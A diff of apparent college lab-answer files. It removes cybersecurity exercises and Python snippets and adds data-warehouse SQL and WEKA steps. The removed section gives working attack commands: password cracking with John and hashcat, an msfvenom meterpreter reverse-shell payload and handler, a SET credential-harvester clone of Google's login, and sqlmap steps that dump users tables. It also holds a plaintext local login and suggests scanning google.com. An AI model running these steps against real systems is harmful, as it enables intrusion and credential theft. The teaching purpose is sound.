+6. Click Next > Next
+7. Select Schemas (globalgadgets_dw) > Next
+8. Next > Execute > Next > Finish (Star Schema appears)
 
-1.4 Requirement:
-● Digital Crime Scene Setup: Mock evidence like a laptop, external hard drive,
-smartphone, USB drive, or handwritten notes.
-● Evidence Bags: Anti-static bags for digital devices and standard bags for physical
-items.
-● Evidence Tags and Labels: Pre-printed or blank labels for identification.
-● Digital Camera: For capturing high-resolution photographs with timestamps.
-● Chain of Custody Forms: To log the evidence handling process.
-● Personal Protective Equipment (PPE): Gloves to prevent contamination.
-● Permanent Markers: For labeling evidence bags.
-● Notebooks and Pens: For documentation.
-● Incident Report Form: For compiling investigation details.
+9. Go back to query page
+10. For Snowflakes Schema
+	DROP TABLE IF EXISTS fact_sales;
+DROP TABLE IF EXISTS dim_city;
+DROP TABLE IF EXISTS dim_state;
+DROP TABLE IF EXISTS dim_country;
 
-In digital forensics, evidence integrity is crucial for its admissibility in court. Proper handling,
-including bagging, tagging, and maintaining the chain of custody, ensures evidence is not
-tampered with or altered.
-● Bagging and Tagging: The process of securely placing evidence in appropriate bags
-and labeling it with critical information such as case number, date, time, and
-investigator details.
-● Chain of Custody: A detailed log that records every individual who handled the
-evidence, the time of transfer, and the purpose.
-● Photographing Evidence: High-resolution images of the evidence are captured at the
-crime scene, showing its original state and surroundings.
+11. Add the code 
+	CREATE TABLE dim_country (
+  country_id INT PRIMARY KEY,
+  country_name VARCHAR(50)
+);
 
-`,
+CREATE TABLE dim_state (
+  state_id INT PRIMARY KEY,
+  state_name VARCHAR(50),
+  country_id INT,
+  FOREIGN KEY (country_id) REFERENCES dim_country(country_id)
+);
 
-"Perform Vulnerability Assessment using Various Vulnerability Assessment Tools": 
-`
-National Vulnerability Database (NVD) https://nvd.nist.gov/
-Common Vulnerabilities and Exposures (CVE) https://cve.mitre.org
+CREATE TABLE dim_city (
+  city_id INT PRIMARY KEY,
+  city_name VARCHAR(50),
+  state_id INT,
+  FOREIGN KEY (state_id) REFERENCES dim_state(state_id)
+);
 
-CVSS Calculator (https://www.first.org/cvss/calculator)
-Base Score (Exploitability & Impact)
-■ Temporal Score (Exploit Code Maturity, Remediation Level, Report
-Confidence)
-■ Environmental Score (Modified impact based on specific environment)
+CREATE TABLE fact_sales (
+  sales_id INT PRIMARY KEY,
+  product_id INT,
+  customer_id INT,
+  time_id INT,
+  city_id INT,
+  quantity_sold INT,
+  total_sales DECIMAL(10,2),
+  FOREIGN KEY (product_id) REFERENCES dim_product(product_id),
+  FOREIGN KEY (customer_id) REFERENCES dim_customer(customer_id),
+  FOREIGN KEY (time_id) REFERENCES dim_time(time_id),
+  FOREIGN KEY (city_id) REFERENCES dim_city(city_id)
+);
 
+11. For Diagram
 
-`,
-
-
-"exp 4 Perform Vulnerability Research using Vulnerability Scoring Systems and Databases:": 
-` Nessus:
-1. Click on the Nessus download link and install the software. 
-Link: https://www.tenable.com/downloads/nessus?loginAttempted=true
-2. Once the installation is complete, a browser window will open automatically to the localhost website.
-3. Click on “Connect via SSL.”
-4. If you see a “connection not secure” warning, click “Advanced” and then “Proceed.”
-5. Click “Continue”, then choose “Register for Nessus Essentials.”
-6. Enter your details and click “Register.”
-7. You will receive an activation code—take a screenshot just in case (though it’s usually not needed).
-8. Click “Continue”, then create your own username and password. Click “Submit.”
-9. Nessus will now download its plugins. Wait for this process to complete.
-10. Once the main Nessus interface loads, look for a spinning icon at the top of the page—this means additional plugins are still being installed.
-11. Wait until all plugin installations are complete. Only then will you be able to create a new scan.
-
-(Rather than installing nessus if not present, then go to this link and enter my username and password. 
-Link: https://localhost:8834/#/scans/folders/my-scans
-Username - Mitali
-Password - Mitali)
-
-12. Once completed create new scan
-13. Click on web application tests
-14. Enter name eg., Test and in target enter a website eg., google.com
-15. Click on Save. After that click on play icon to launch scanning. 
-16. Once done, generate its report
-
- Nessus Vulnerability Scanner 
-Nessus is a network vulnerability scanner that identifies security weaknesses, outdated software, and misconfigurations on a host or network.
-✅ Steps:
-1. Download & install Nessus
-2. Register for Nessus Essentials 
-3. After setup:
-4. Click New Scan → Choose Web Application Tests
-5. Enter scan name (e.g., Test)
-6. Set target IP: 192.168.56.102
-7. Save and click ▶️ to launch the scan
-8. View and generate the vulnerability report.
-
-Nessus (Vulnerability Scanner)
-Nessus is a powerful vulnerability assessment tool that scans systems for security flaws, missing
-patches, and configuration issues. It provides detailed reports and risk assessments, making it
-widely used in enterprise security
-`,
-
-
-
-"exp 5 Perform an Active online attack to crack systems password":
- `john
-echo -n "1234a" | md5sum
-echo -n "123" | md5sum
-nano hashes.txt
-
-
-To exit - ctrl x
-john --format=raw-md5 hashes.txt
-john --show --format=raw-md5 hashes.txt
-cat hashes.txt 
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
+Go To Database > Reverse Engineering >
+In Stored Connection: (choose db )
+Click Next > Next
+Select Schemas (globalgadgets_dw) > Next
+Next > Execute > Next > Finish (Snowflakes Schema appears)
 
 `,
-
-
-"Escalate Privileges using Privilege Escalation Tools such as: Metasploit Framework, PowerShell Empire.":
-`open kali Linux and run each command 
-
-ifconfig
-
-ping (10.0.2.15) enter ip from above received i net
-sudo -i
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15
-msfconsole 
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-
-set LPORT 10.0.2.15
-set LPORT 12345
-set LHOST 10.0.2.15
-exploit
-`,
-
-
-"Use Steganography tools to Hide Data. Recommended Tools: Steghide,OpenStego,SteganoG.": 
-`
-🔸 Steghide Steps 
-1. Download steghide
-   Command:
-   sudo apt install steghide
-
-2. Go to Desktop
-   Command:
-   cd Desktop
-
-3. Download an image using Firefox
-   - Example: Save a hacker.jpeg image to Desktop.
-
-4. Create a secret text file
-   Command:
-   echo "This is execution of steghide in kali linux" > secret_key.txt
-
-5. See the files
-   Command:
-   ls
-
-6. View the contents of the txt file
-   Command:
-   cat secret_key.txt
-
-7. Hide the secret file inside the image
-   Command:
-   steghide embed -cf hacker.jpeg -ef secret_key.txt
-   #cf = cover file (image), ef = embedded file (text)
-
-8. Enter passphrase
-   - Example: pass
-
-9. Check file list again
-   Command:
-   ls -l         
-   #The -l option in ls -l shows a detailed (long) listing of files, including permissions, owner, size, and modification date.
-
-10. Extract the hidden text from image
-    Command:
-    steghide extract -sf hacker.jpeg
-
-11. Read the extracted text
-    Command:
-    cat secret_key.txt
-
-12. Done ✅`,
-
-
-"exp 8 Explore Social Engineering attacks using SET Toolkit.": 
-`
-1.sudo setoolkit
-
-2.Accept the disclaimer by typing y and press Enter
-
-3.Select 1 for social engineering and Click Enter
-
-4.select option 2 i.e. Website Attack Vectors from the menu and click enter.
-
-5.select option 3 i.e. ‘Credential Harvester Attack Method’ from the menu
-
-6.select option 1 i.e. ‘Web Templates’ and click enter.
-
-7.select option 2 and click enter
-
-8.select option 2 i.e. Google website to clone its template
-
-9.Enter Y and click Enter
-
-10.open firefox and enter "http://127.0.0.1"
-
-11.Enter the details below:
-	USERNAME: victim@gmail.com
-	PASSWORD: password123
-
-`,
-
-
-"exp 9 Perform static and dynamic malware analysis. ": 
-`A) Static malware Analysis(on Kali Linux)
-
-1. echo "This is a harmless file for static malware analysis practice." > malware_sample.exe
-
-2. echo -e "cmd.exe /c start\nhttp://malicious-site.com\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" >> malware_sample.exe
-
-3. file malware_sample.exe
-
-4. cat malware_sample.exe
-
-5. strings malware_sample.exe | less
-
-6. open new terminal and enter: sha256sum malware_sample.exe
-
-Next
-Open virustotal on firefox
-upload file malware_sample.exe
-
-Done
-
-
-Static Malware Analysis:
-Static analysis examines malware code without actually running it, focusing on the code's
-structure, strings, and signatures.
-Techniques:
-● Signature-based detection: Comparing the malware's digital footprint against a
-database of known malicious signatures.
-● Hashing: Calculating a unique identifier for the malware file to identify duplicates
-or variations.
-● Fuzzing: Testing the malware with various inputs to identify potential
-vulnerabilities.
-● Disassembly/Reverse Engineering: Examining the disassembled code to
-understand the malware's functionality
-
-`,
-
-
-"exp 10 To detect SQL injection vulnerabilities using automated tools like SQLMap and Burp Scanner, identifying injection points and exploiting database vulnerabilities.":
- `testing the below url
- http://testphp.vulnweb.com/
-
-Open kali Linux
-
-1.sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --crawl 2 --batch
-
--u: target URL
---crawl 2: follows 2 levels of links to find inputs
---batch: runs in auto mode without asking questions
-
-2.Use Extra Detection Options
-
-sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --crawl 2 --technique=U --threads 5 --level 2 --risk 2 --batch
-
---technique=U: use UNION-based injections
---threads 5: faster scanning
---risk and --level: increase the depth of testing
-
-3. 
-1.Enumerate & Exploit
-sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --current-user --current-db --hostname --batch
-
-2.List all databases:
-sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
-
-3.Pick a database (e.g., acuart) and list its tables:
-sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
-
-4.Pick a table (e.g., users) and list columns:
-sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
-
-5.Dump the data:
-sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
-
-4.Save the Output to a Report
-
-sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --crawl 2 --output-dir="sqlmap_report" --batch
+   files: [
+        "snowflake.sql"
+      ]  
+},
 
 
 
-SQL injection is a code injection technique that can compromise your database. It is one of the most common webnhacking techniques . SQL injection is the injection of malicious code into SQL statements via web page input . The hacker can retrieve all the user data present in the database such as user details, credit card information, and social security numbers, and can also gain access to protected areas like the administrator portal. It is also possible to delete ser data from the tables . To perform a SQL injection attack, an attacker can use web page inputs as statements through SQL commands to manipulate the application’s web server . The most timeless and effective method to detect SQL injection
-vulnerabilities is penetration testing . SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL Injection flaws and taking over database servers. SQLMap is a modular framework written in Python. It can detect most of the SQL injection flaws across the different platforms. The following databases are supported: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MaxDB. After exploitation is successful, it can enumerate databases and tables and also can dump database and tables. 
+
+
+"OLAP operations sales data warehouse of GlobalGadgets":  {
+      code:`
+1. Add the queries below to (query) 
+   (After every semicolon(;) Click 'ctrl+enter')
+
+	DROP DATABASE IF EXISTS globalgadgets_dw;
+CREATE DATABASE globalgadgets_dw;
+USE globalgadgets_dw;
+CREATE TABLE dim_product (
+  product_id INT PRIMARY KEY,
+  product_name VARCHAR(100),
+  category VARCHAR(50),
+  brand VARCHAR(50)
+);
+
+CREATE TABLE dim_customer (
+  customer_id INT PRIMARY KEY,
+  customer_name VARCHAR(100),
+  gender VARCHAR(10),
+  age INT
+);
+
+CREATE TABLE dim_time (
+  time_id INT PRIMARY KEY,
+  date DATE,
+  month VARCHAR(20),
+  quarter VARCHAR(10),
+  year INT
+);
+
+CREATE TABLE dim_location (
+  location_id INT PRIMARY KEY,
+  city VARCHAR(50),
+  state VARCHAR(50),
+  country VARCHAR(50)
+);
+
+CREATE TABLE fact_sales (
+  sales_id INT PRIMARY KEY,
+  product_id INT,
+  customer_id INT,
+  time_id INT,
+  location_id INT,
+  quantity_sold INT,
+  total_sales DECIMAL(10,2),
+  FOREIGN KEY (product_id) REFERENCES dim_product(product_id),
+  FOREIGN KEY (customer_id) REFERENCES dim_customer(customer_id),
+  FOREIGN KEY (time_id) REFERENCES dim_time(time_id),
+  FOREIGN KEY (location_id) REFERENCES dim_location(location_id)
+);
+
+INSERT INTO dim_customer (customer_id, customer_name, gender, age) VALUES
+(1, 'Alice Sharma', 'F', 28),
+(2, 'Rahul Mehta', 'M', 35),
+(3, 'Neha Verma', 'F', 24),
+(4, 'Amit Patel', 'M', 40),
+(5, 'Sana Iqbal', 'F', 30);
+INSERT INTO dim_location (location_id, city, state, country) VALUES
+(101, 'Mumbai', 'Maharashtra', 'India'),
+(102, 'Bangalore', 'Karnataka', 'India'),
+(103, 'Delhi', 'Delhi', 'India'),
+(104, 'Chennai', 'Tamil Nadu', 'India'),
+(105, 'Pune', 'Maharashtra', 'India');
+INSERT INTO dim_product (product_id, product_name, category, brand) VALUES
+(501, 'Smartphone', 'Electronics', 'Samsung'),
+(502, 'Headphones', 'Accessories', 'Boat'),
+(503, 'Tablet', 'Electronics', 'Apple'),
+(504, 'Smartwatch', 'Accessories', 'Noise'),
+(505, 'Laptop', 'Electronics', 'Dell');
+INSERT INTO dim_time (time_id, date, month, quarter, year) VALUES
+(1001, '2025-07-21', 'July', 'Q3', 2025),
+(1002, '2025-07-22', 'July', 'Q3', 2025),
+(1003, '2025-07-23', 'July', 'Q3', 2025),
+(1004, '2025-08-01', 'August', 'Q3', 2025),
+(1005, '2025-08-05', 'August', 'Q3', 2025);
+INSERT INTO fact_sales (sales_id, product_id, customer_id, time_id, location_id, quantity_sold, total_sales) VALUES
+(9001, 501, 1, 1001, 101, 2, 30000.00),
+(9002, 502, 2, 1002, 102, 1, 2000.00),
+(9003, 503, 3, 1003, 103, 1, 10000.00),
+(9004, 504, 4, 1004, 104, 2, 10000.00),
+(9005, 505, 5, 1005, 105, 1, 55000.00);
+
+SELECT * FROM dim_customer;
+SELECT * FROM dim_location;
+SELECT * FROM dim_product;
+SELECT * FROM dim_time;
+SELECT * FROM fact_sales;
+
+
+-- run OLAP Operations
+
+
+-- SLICE Operation
+
+SELECT 
+    dp.category,
+    dl.country,
+    SUM(fs.total_sales) AS total_sales_2025
+FROM fact_sales fs
+JOIN dim_product dp ON fs.product_id = dp.product_id
+JOIN dim_time dt ON fs.time_id = dt.time_id
+JOIN dim_location dl ON fs.location_id = dl.location_id
+WHERE dt.year = 2025
+GROUP BY dp.category, dl.country;
+
+-- DICE Operation
+
+SELECT 
+    dp.brand,
+    dl.city,
+    SUM(fs.total_sales) AS total_sales
+FROM fact_sales fs
+JOIN dim_product dp ON fs.product_id = dp.product_id
+JOIN dim_time dt ON fs.time_id = dt.time_id
+JOIN dim_location dl ON fs.location_id = dl.location_id
+WHERE dp.category = 'Electronics'
+  AND dl.country = 'India'
+  AND dt.quarter = 'Q3'
+GROUP BY dp.brand, dl.city;
+
+-- ROLL-UP Operation
+
+SELECT 
+    dl.country,
+    dl.state,
+    dl.city,
+    SUM(fs.total_sales) AS total_sales
+FROM fact_sales fs
+JOIN dim_location dl ON fs.location_id = dl.location_id
+GROUP BY dl.country, dl.state, dl.city WITH ROLLUP;
+
+-- DRILL-DOWN Operation
+
+SELECT 
+    dp.category,
+    dp.product_name,
+    SUM(fs.total_sales) AS total_sales
+FROM fact_sales fs
+JOIN dim_product dp ON fs.product_id = dp.product_id
+GROUP BY dp.category, dp.product_name
+ORDER BY dp.category;
+
+-- PIVOT (Cross-tab) Operation
+
+SELECT 
+    dp.category,
+    SUM(CASE WHEN dt.quarter = 'Q1' THEN fs.total_sales ELSE 0 END) AS Q1_Sales,
+    SUM(CASE WHEN dt.quarter = 'Q2' THEN fs.total_sales ELSE 0 END) AS Q2_Sales,
+    SUM(CASE WHEN dt.quarter = 'Q3' THEN fs.total_sales ELSE 0 END) AS Q3_Sales,
+    SUM(CASE WHEN dt.quarter = 'Q4' THEN fs.total_sales ELSE 0 END) AS Q4_Sales
+FROM fact_sales fs
+JOIN dim_product dp ON fs.product_id = dp.product_id
+JOIN dim_time dt ON fs.time_id = dt.time_id
+GROUP BY dp.category;
 
 `,
+files: [
+        "OLAP.sql"
+        
+      ] 
+    },
 
 
-"exp 11 Perform File and Text Message Encryption using a freely available tool.": 
-`download and install veracrypt
-https://launchpad.net/veracrypt/trunk/1.26.20/+download/VeraCrypt%20Setup%201.26.20.exe
 
-1. Create Volume
-	Click Next
-	Click Next
+"Perform data cleaning, transformation, and visualization using WEKA":  {
+      code:`
 
+1. open WEKA > Explorer > Open file > Select file'GlobalGadgets_Sales_Analysis.csv'
+2. Visualize All
+3. Data Cleaning 
+	(a) Apply “ReplaceMissingValues” Filter
+		Click Choose under “Filter”
+		filters → unsupervised → attribute → ReplaceMissingValues
+		Click Apply(WEKA replaces any blank cells with mean/mode values)
+	
+	(b) Remove Irrelevant Attributes
+		filters → unsupervised → attribute → Remove
+		Click on Remove > attributeIndices > enter 6,12 (to remove columns 6 and 12)
+		Click Apply
 
-2.Click select file
-Go to C: drive
-create folder MyVolume.hc and save
-Click Next
-In Encryption Options
- select Encryption option AES
- hash algorithm option SHA-512
-click Next
-
-3.Volume Size 250 MB
- Click Next
-
-4. Enter Password
-  Click Next
-
-5. In Volume Format
-  Click Format
-
-The volume has been successfully created
- click ok
- click exit
-
-6. Select volume M:
-   Select file 
-   MyVolume.hc
-Click open
-Click Mount
-Enter Password
-Click ok select PRF: HMAC-SHA-512
-
-You can now see the drive in file explorer
-
-done 
-
-now dismount
+4. Data Tansformation
+	(a) Normalize Data
+		Click Choose again under Filter.
+		filters → unsupervised → attribute → Normalize
+		Click Apply
+		(Scales all numeric attributes (like Quantity_Sold, Total_Sales, Age) between 0 and 1.)
+	(b) Discretize Continuous Attributes
+		filters → unsupervised → attribute → Discretize
+		Click Discretize > bins = 4
+		Click Total sales (numeric value)
+	(c) Convert Strings to Nominal
+		filters → unsupervised → attribute → StringToNominal
+		Click Apply
+		(Converts text data (like Product_Name, Brand) into categorical form WEKA can analyze.)
 
 
-Encryption is the process of converting plaintext into ciphertext to protect
-data from unauthorized access. It ensures confidentiality and integrity of the information.
-There are two primary types of encryption:
-● Symmetric Encryption: Uses the same key for encryption and decryption (e.g., AES,
-DES).
-● Asymmetric Encryption: Uses a pair of keys – public key for encryption and private
-key for decryption (e.g., RSA, ECC).
-Encryption is widely used for securing files, emails, and communication. Freely available
-tools allow users to encrypt data without requiring extensive cryptographic knowledge.
+5. Visualization
+	(a) Go to the Visualize Tab
+	(b) Change Color by Attribute
+	In the Color dropdown: Select Category or Brand
+			       You’ll now see colored clusters by product type.
+
+	(c) View Individual Attribute Distributions
+	Go back to Preprocess
+	Click any attribute (like Total_Sales or Category)
+
+	(d) Save Your Visualization
+	Right-click a plot → “Visualize All”
+	You can:Save image as .png
+		Export plot to use in your report
 
 
 `,
+files: [
+        "GlobalGadgets_Sales_Analysis.csv"
+      ] 
+    },
 
 
-"exp 12 Perform Cryptanalysis using Various Cryptanalysis Tools like Hashcat": 
-`
-1.  Install Hashcat
-sudo apt update
-sudo apt install hashcat -y
+"Implement discretization binning or k-Means using WEKA":  {
+      code:`
+1. Open WEKA > Explorer > Open file > Select file 'GlobalGadgets_Sales_Analysis.csv'
+2. Choose filter > Discretize > Click Discretize > bins = 5
+
+    Click Apply
+3. For k-Means Clustering
+   (a) Choose Cluster > SimpleKMeans
+   (b) Set the numclusters = 3
+   (c) Click Start
+   (d) View the results in the Clusters tab
+Step 5: Visualize the Clusters
+  In Result List, right click on simplekmeans > Visualize Cluster Assignments
+  X-axis: Total_Sales
+  Y-axis: Quantity_Sold
+  Each point = one record (sale transaction)
+  Each color = one cluster group
+  Cluster 0 → Low Sales (points on the left)
+  Cluster 1 → Medium Sales (middle)
+  Cluster 2 → High Sales (right)
+`,
+files: [
+        "GlobalGadgets_Sales_Analysis.csv"
+      ] 
+    },
 
 
-2. hash-identifier
-	5f4dcc3b5aa765d61d8327deb882cf99
-
-if needed unzip using gunzip /usr/share/wordlists/rockyou.txt.gz
 
 
-3. echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt
-
-4. Check ls /usr/share/wordlists/rockyou.txt
-
-5. hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
-
-6. hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a
-
-7. hashcat -m 0 -a 6 hash.txt /usr/share/wordlists/rockyou.txt ?d?d?d
-
-8. cat cracked.txt
-
-
-
-Cryptanalysis is the study of analyzing and breaking cryptographic security systems. Hash
-functions are commonly used in password storage, and attackers use cryptanalysis tools to
-recover plaintext passwords from hashes.
-Hashcat is a widely used password recovery tool that supports multiple hashing algorithms.
-It employs various attack techniques:
-● Dictionary Attack: Tries a list of pre-defined words.
-● Brute-force Attack: Generates and tests all possible combinations.
-● Hybrid Attack: Combines dictionary words with additional characters.
-● Mask Attack: Targets passwords with known structures.
-
-Common hash types and their identifiers:
-● MD5: -m 0
-● SHA-1: -m 100
-● SHA-256: -m 1400
-● NTLM (Windows Passwords): -m 1000
-● WPA/WPA2 (Wi-Fi Passwords): -m 22000
-
+"":  {
+      code:`
 
 `,
+files: [
+        ""
+      ] 
+    },
 
 
-"exp 13 ": 
-`Experiment 13
-13.1 Aim: To conduct a comprehensive research-based analysis of a selected cybersecurity
-incident, focusing on the technical, organizational, and policy-level failures, with the objective of
-understanding security challenges and proposing preventive measures.
-13.2 Course Outcome: To analyze cybersecurity incidents, understand attack methods and
-vulnerabilities, and assess their technical, legal, and ethical impacts.
-13.3 Lab Objective: students will be able to analyze real-world cyber incidents, identify
-technical and organizational failures, and recommend effective security measures.
-13.4 Requirement (Research-Based Study):
-● News Outlets: Wired, The Verge, TechCrunch, BBC, Economic Times, etc.
-● Cybersecurity Blogs: KrebsOnSecurity, Palo Alto Unit42, Rapid7, Cisco Talos
-● Technical Reports: From US-CERT, CISA, MITRE, and NIST
-● Incident Analysis: Case studies published by SANS Institute, OWASP, Cloud Security Alliance
-● Whitepapers: From security vendors (McAfee, Symantec, FireEye, etc.)
-● Academic Papers: IEEE, SpringerLink, Google Scholar (for deeper technical insight)
-1. Introduction
-Purpose of the Study:
-This report aims to analyze the Capital One data breach, highlighting the technical,
-organizational, and policy-level failures that enabled the incident. The goal is to extract lessons
-and recommend preventive measures applicable to modern cloud infrastructures.
-Background:
-Capital One, a major U.S. bank, adopted AWS cloud services to support its digital operations.
-While cloud migration offers scalability and efficiency, it also introduces new security
-challenges—especially around misconfigured services and access management.
-2. Breach Overview
-Timeline:
-● March 2019: Unauthorized access to Capital One’s cloud resources begins.
-● July 17, 2019: Capital One is notified by an external security researcher.
-● July 29, 2019: Capital One discloses the breach publicly.
-Key Player:
-● Paige Thompson, a former AWS employee, exploited misconfigured cloud resources
-using knowledge of AWS infrastructure.
-Services Affected:
-● Over 100 million customer records were compromised, including names, addresses,
-credit scores, and social security numbers.
-3. Technical Breakdown
-Metadata Service Vulnerability:
-The attacker exploited a Server-Side Request Forgery (SSRF) vulnerability in a web
-application firewall (WAF). This allowed access to AWS EC2 instance metadata, including IAM
-role credentials.
-Data Accessed:
-● Personally identifiable information (PII)
-● Social Security Numbers (SSNs)
-● Credit card application data
-● Bank account numbers (in limited cases)
-4. Security Failures
-Technical Failures:
-● Misconfigured WAF allowing SSRF
-● Overly permissive IAM roles
-● Lack of fine-grained access controls
-Organizational Failures:
-● Insufficient internal security audits
-● Lack of proper configuration monitoring
-● Inadequate incident response preparedness
-Logging/Monitoring Issues:
-While AWS did provide logs, they were not actively monitored or integrated with SIEM tools to
-detect unusual access patterns in real-time.
-6. Recommendations
-● Implement least privilege access for IAM roles
-● Regular audits of cloud configurations (CSPM tools)
-● Monitor metadata access using AWS GuardDuty or CloudTrail
-● Patch known SSRF vulnerabilities in WAFs
-● Conduct red-team assessments and cloud-specific pentests
-7. Legal and Regulatory Implications
-● Capital One was fined $80 million by the Office of the Comptroller of the Currency
-(OCC).
-● Multiple class-action lawsuits followed, citing failure to protect consumer data.
-● Raised concerns under GDPR, CCPA, and GLBA regarding cloud data handling and
-third-party risk.
-8. Conclusion
-Lessons Learned:
-● Cloud misconfigurations can lead to catastrophic breaches.
-● Insider knowledge can amplify attacks.
-● Real-time monitoring and proactive threat detection are essential.
-Application to Current Cloud Deployments:
-● Shift-left security: integrate security in development pipelines.
-● Use of Zero Trust Architecture (ZTA).
-● Continuous training for security teams in cloud security principles.
-9. References
-(Include a mix of the following, properly cited)
-● Wired article: “The Capital One Hacker Was Caught Thanks to Slack”
-● US-CERT alert on cloud misconfigurations
-● CISA advisory on SSRF vulnerabilities
-● IEEE paper on cloud access security
-● Blog post from Palo Alto’s Unit42 on SSRF in AWS
 
-`
-  },
+
+"":  {
+      code:`
+
+`,
+files: [
+        ""
+      ] 
+    },
+
+
+
+
+"":  {
+      code:`
+
+`,
+files: [
+        ""
+      ] 
+    },
+
+
+
+
+"":  {
+      code:`
+
+`,
+files: [
+        ""
+      ] 
+    },
+
+
+
+
+
+
+
+
+
+
+    
+},
   
 DBMS: {
     "FCFS Scheduling": `// First Come First Serve Scheduling
@@ -656,277 +1520,20 @@ public class FCFS {
   },
   
 PYTHON: {
-    "Basic Data Types, Operators, and Control Statements": 
-    ` 
-a = int(input("Enter an integer: ")) 
-b = float(input("Enter a float: ")) 
-c = input("Enter a string: ") 
-print("Integer:", a) 
-print("Float:", b) 
-print("String:", c)  
-print("Addition:", a + b) 
-print("Multiplication:", a * b) 
-if a > b: 
-    print("Integer is greater than float.") 
-elif a == b: 
-    print("Both are equal.") 
-else: 
-    print("Float is greater than integer.") `,
-
-"Lists Tuples and Dictionaries": 
-    `names = input("Enter names (comma separated): ").split(',') 
-ages = input("Enter corresponding ages (comma separated): ").split(',') 
-ages = [int(age) for age in ages] 
-info = dict(zip(names, ages)) 
-print("List of names:", names) 
-print("Tuple of ages:", tuple(ages)) 
-print("Dictionary (name: age):") 
-for name, age in info.items(): 
-    print(name, ":", age) `,
-
-"Classes and Inheritance (Minimal Class Use Required)": 
-    `class Person: 
-    def __init__(self, name): 
-        self.name = name 
-    def show(self): 
-        print("Name:", self.name) 
-class Student(Person): 
-    def __init__(self, name, roll): 
-        super().__init__(name) 
-        self.roll = roll 
-    def display(self): 
-        print("Roll Number:", self.roll) 
-name = input("Enter your name: ") 
-roll = input("Enter your roll number: ") 
-s = Student(name, roll) 
-s.show() 
-s.display()`,
-
-"Custom Exception with User Input": 
-    `class NegativeNumberError(Exception): 
-    pass 
-try: 
-    num = int(input("Enter a positive number: ")) 
-    if num < 0: 
-        raise NegativeNumberError("Negative number entered.") 
-    print("Number is valid:", num) 
-except ValueError: 
-    print("Invalid input. Please enter an integer.") 
-except NegativeNumberError as e: 
-    print("Error:", e) `,
-
-
-"File Read, Append, and Display": 
-    `filename = "example.txt" 
-data = input("Enter text to append to file: ") 
-with open(filename, "a") as file: 
-    file.write(data + "\n") 
-print("\n--- File Content ---") 
-with open(filename, "r") as file: 
-    content = file.read() 
-    print(content) `
-,
-
-"Count Lines, Words, Characters in File": 
-    ` 
-filename = "example.txt" 
-with open(filename, "r") as file: 
-    content = file.read() 
-lines = content.splitlines() 
-words = content.split() 
-characters = len(content) 
-print("Number of lines:", len(lines)) 
-print("Number of words:", len(words)) 
-print("Number of characters:", characters)`,
-
-
-"Simple Tkinter GUI (Labels, Entry, Button)": 
-    `import tkinter as tk 
-root = tk.Tk() 
-root.title("Simple GUI") 
-root.geometry("300x150") 
-label = tk.Label(root, text="Enter your name:") 
-label.pack() 
-entry = tk.Entry(root) 
-entry.pack() 
-output = tk.Label(root, text="") 
-output.pack() 
-def show_message(): 
-    name = entry.get() 
-    output.config(text="Hello, " + name) 
-button = tk.Button(root, text="Submit", command=show_message) 
-button.pack() 
-root.mainloop()` ,
-
-"Stack and Queue using Lists": 
-    `stack = [] 
-queue = [] 
-item = input("Enter item to push to stack: ") 
-stack.append(item) 
-print("Stack after push:", stack) 
-stack.pop() 
-print("Stack after pop:", stack) 
-item = input("Enter item to enqueue to queue: ") 
-queue.append(item) 
-print("Queue after enqueue:", queue) 
-queue.pop(0) 
-print("Queue after dequeue:", queue) ` ,
-
-"*SQLite CRUD Program": 
-    `import sqlite3 
-conn = sqlite3.connect("records.db") 
-cursor = conn.cursor() 
-cursor.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY 
-KEY, name TEXT)") 
-while True: 
-    print("\n1. Insert\n2. View\n3. Update\n4. Delete\n5. Exit") 
-    ch = input("Enter your choice: ") 
-    if ch == '1': 
-        name = input("Enter name: ") 
-        cursor.execute("INSERT INTO users (name) VALUES (?)", (name,)) 
-        conn.commit() 
-        print("Record added.") 
-    elif ch == '2': 
-        cursor.execute("SELECT * FROM users") 
-        for row in cursor.fetchall(): 
-            print(row) 
-    elif ch == '3': 
-        id = input("Enter ID to update: ") 
-        name = input("Enter new name: ") 
-        cursor.execute("UPDATE users SET name=? WHERE id=?", (name, id)) 
-        conn.commit() 
-        print("Record updated.") 
-    elif ch == '4': 
-        id = input("Enter ID to delete: ") 
-        cursor.execute("DELETE FROM users WHERE id=?", (id,)) 
-        conn.commit() 
-        print("Record deleted.") 
-    elif ch == '5': 
-        break 
-    else: 
-        print("Invalid choice.") 
-conn.close() ` ,
-
-"Client-Server Communication with Sockets": 
-    `*Server:* 
-import socket 
-server_socket = socket.socket() 
-server_socket.bind(("localhost", 12345)) 
-server_socket.listen(1) 
-print("Waiting for connection...") 
-conn, addr = server_socket.accept() 
-print("Connected to:", addr) 
-msg = conn.recv(1024).decode() 
-print("Client says:", msg) 
-conn.send("Hello from server!".encode()) 
-conn.close() 
- 
-*Client:* 
-import socket 
-client_socket = socket.socket() 
-client_socket.connect(("localhost", 12345)) 
-client_socket.send("Hello from client!".encode()) 
-msg = client_socket.recv(1024).decode() 
-print("Server says:", msg) 
-client_socket.close() ` ,
-
-"Web Scraping with requests": 
-    `import requests 
-url = input("Enter a URL (e.g., https://example.com): ") 
-try: 
-    response = requests.get(url) 
-    print("Status code:", response.status_code) 
-    print("\n--- First 500 characters of page content ---\n") 
-    print(response.text[:500]) 
-except Exception as e: 
